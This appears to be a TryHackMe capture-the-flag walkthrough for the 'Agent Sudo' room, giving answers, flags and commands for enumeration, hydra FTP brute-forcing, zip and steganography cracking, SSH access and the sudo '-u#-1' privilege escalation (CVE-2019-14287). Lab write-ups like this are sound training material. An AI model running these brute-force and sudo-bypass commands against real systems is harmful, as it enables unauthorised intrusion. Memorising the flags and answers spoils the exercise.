![Agent Sudo Banner](https://tryhackme.com/img/banners/default_tryhackme.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/agentsudoctf/Agent_Sudo_Cover.png" alt="Agent Sudo Logo">
</p>

# Agent Sudo

This guide contains the answer and steps necessary to get to them for the [Agent Sudo](https://tryhackme.com/room/agentsudoctf) room.

## Table of contents

- [Enumerate](#enumerate)
- [Hash cracking and brute-force](#hash-cracking-and-brute-force)
- [Capture the user flag](#capture-the-user-flag)
- [Privilege escalation ](#privilege-escalation)

### Enumerate

**IP Adress:** 10.10.203.242

1. How many open ports?

   nmap -sV 10.10.203.242


   ><details><summary>Click for answer</summary>3</details>

2. How you redirect yourself to a secret page?

   Another way is to use curl -A "User-agent"

   ><details><summary>Click for answer</summary>user-agent</details>

3. What is the agent name?



   ><details><summary>Click for answer</summary>chris</details>

### Hash cracking and brute-force



1. FTP password

   hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.203.242 -t 4


   ><details><summary>Click for answer</summary>crystal</details>

2. Zip file password

   The two images don't tell us much. The text file, however, gives us some clues as to what we might need to do next.
   
   CRACKING TEXT FILE
   
   Lets start with the jpg file. Using steghide we stry to find anything hidden, but unfortunately we need a passphrase and the png file doesn't seem to give us contain anything. Using strings does give us some clues that something is hidden inside.
   
   ```cmd
   strings cutie.png
   ```
   
   CRACKING PNG STRINGS
   
   We can try using `binwalk` to get anything from it.
   
   ```cmd
   binwalk cutie.png -e
   ```
   
   CRACKING EXTRACT IMAGE
   
   Looks like there are some files and a zip archive hidden inside. Looking at the text file and the other two files gives us nothing. Neither when using `file` or `strings`. The zip file on the other hand does seem to contain a note. However, it is password protected. We can use `fcrackzip` to try a crack the password
   
   ```cmd
   fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt _cutie.png.extracted/8702.zip
   ```
   
   CRACKING FCRACKZIP
   
   Unfortunately, it couldn't find the password. Next thing to try is `john`. But we first need to create a hash from the zipfile using `zip2john`. Then we can use it in John.
   
   ```cmd
   zip2john _cutie.png.extracted/8702.zip > ziphash.txt
   
   john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
   ```
   
   CRACKING ZIP JOHN
   
   With the password found, we can open the textfile and read its contents.
   
   CRACKING ZIP MESSAGE
   
   The name seems to be base64 encoded. Using Cyberchef this gives us Area51.
   
   CRACKING CYBERCHEF

   ><details><summary>Click for answer</summary>alien</details>

3. steg password

stegseek --crack -sf cute-alien.jpg -wl /usr/share/wordlists/rockyou.txt 

   ><details><summary>Click for answer</summary>Area51</details>

4. Who is the other agent (in full name)?



   ><details><summary>Click for answer</summary>James</details>

5. SSH password



   ><details><summary>Click for answer</summary>hackerrules!</details>

### Capture the user flag



1. What is the user flag?

   Using username chris doesn't allow us to log in with SSH and the password we found. James, however, does work.
   
   ```cmd
   ssh james@10.10.186.39
   ```
   
   CAPTURE SSH LOGIN
   
   Looking through the directory we can see the user flag and read its contents.
   
   CAPTURE USER FLAG

   ><details><summary>Click for answer</summary>b03d975e8c92a7c04146cfa7a5a313c7</details>

2. What is the incident of the photo called?

   We can download the image through `scp`.
   
   ```cmd
   scp james@10.10.186.39:/home/james/Alien_autospy.jpg Alien_autospy.jpg 
   ```
   
   CAPTURE DOWNLOAD IMAGE SSH
   
   

   ><details><summary>Click for answer</summary>Roswell alien autopsy</details>

### Privilege escalation 

sudo -l
sudo -V
sudo /bin/bash
sudo -u#-1 /bin/bash


1. CVE number for the escalation 

   PRIVESC PERMISSIONS
   
   PRIVESC SUDO BASH
   
   PRIVESC SUDO EXPLOIT

   ><details><summary>Click for answer</summary>CVE-2019-14287</details>

2. What is the root flag?

   PRIVESC SUDO VERSION
   
   PRIVESC SUDO ROOT
   
   PRIVESC SUDO FLAG

   ><details><summary>Click for answer</summary>b53a02f55b57d4439e3341834d70c062</details>

3. (Bonus) Who is Agent R?



   ><details><summary>Click for answer</summary>DesKel</details>
